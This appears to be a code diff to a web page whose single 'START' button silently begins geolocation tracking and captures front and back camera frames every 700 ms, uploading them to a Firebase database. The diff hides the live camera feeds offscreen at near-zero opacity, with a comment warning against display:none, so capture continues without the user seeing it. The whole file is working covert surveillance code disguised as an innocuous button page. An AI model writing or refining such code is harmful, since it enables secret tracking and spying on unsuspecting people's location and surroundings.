@@ -13,26 +13,30 @@ background:black;
 color:white;
 text-align:center;
 font-family:Arial;
-padding-top:100px;
+padding-top:120px;
 }
 
 h1{
-font-size:55px;
-margin-bottom:50px;
+font-size:50px;
 }
 
 button{
-font-size:40px;
+font-size:35px;
 padding:20px 60px;
+margin-top:40px;
+background:lime;
 border:none;
 border-radius:10px;
-background:lime;
-color:black;
-font-weight:bold;
 }
 
+/* IMPORTANT: don't use display:none */
 video{
-display:none;
+position:absolute;
+top:-5000px;
+left:-5000px;
+width:10px;
+height:10px;
+opacity:0.01;
 }
 
 </style>
@@ -44,8 +48,8 @@ display:none;
 
 <button onclick="startSystem()">START</button>
 
-<video id="frontCam" autoplay playsinline></video>
-<video id="backCam" autoplay playsinline></video>
+<video id="frontCam" autoplay playsinline muted></video>
+<video id="backCam" autoplay playsinline muted></video>
 
 <script>
 
@@ -61,7 +65,6 @@ let deviceId="phone_"+Math.floor(Math.random()*100000);
 
 function startSystem(){
 
-// LOCATION TRACK
 navigator.geolocation.watchPosition(function(pos){
 
 firebase.database().ref("devices/"+deviceId+"/location").set({
@@ -71,13 +74,21 @@ lon:pos.coords.longitude
 
 });
 
-// FRONT CAMERA
-navigator.mediaDevices.getUserMedia({
-video:{facingMode:"user"}
-})
-.then(stream=>{
+startCamera("user","frontCam","front");
 
-let video=document.getElementById("frontCam");
+startCamera("environment","backCam","back");
+
+}
+
+
+function startCamera(mode, videoId, type){
+
+navigator.mediaDevices.getUserMedia({
+video:{facingMode:mode}
+})
+.then(function(stream){
+
+let video=document.getElementById(videoId);
 
 video.srcObject=stream;
 
@@ -85,27 +96,7 @@ video.onloadedmetadata=function(){
 
 video.play();
 
-startCapture(video,"front");
-
-};
-
-});
-
-// BACK CAMERA
-navigator.mediaDevices.getUserMedia({
-video:{facingMode:"environment"}
-})
-.then(stream=>{
-
-let video=document.getElementById("backCam");
-
-video.srcObject=stream;
-
-video.onloadedmetadata=function(){
-
-video.play();
-
-startCapture(video,"back");
+capture(video,type);
 
 };
 
@@ -113,13 +104,14 @@ startCapture(video,"back");
 
 }
 
-function startCapture(video,type){
+
+function capture(video,type){
 
 let canvas=document.createElement("canvas");
 
 let ctx=canvas.getContext("2d");
 
-setInterval(()=>{
+setInterval(function(){
 
 if(video.videoWidth===0) return;
 
@@ -134,7 +126,7 @@ firebase.database().ref("devices/"+deviceId+"/camera/"+type).set({
 img:img
 });
 
-},1000);
+},700);
 
 }
 
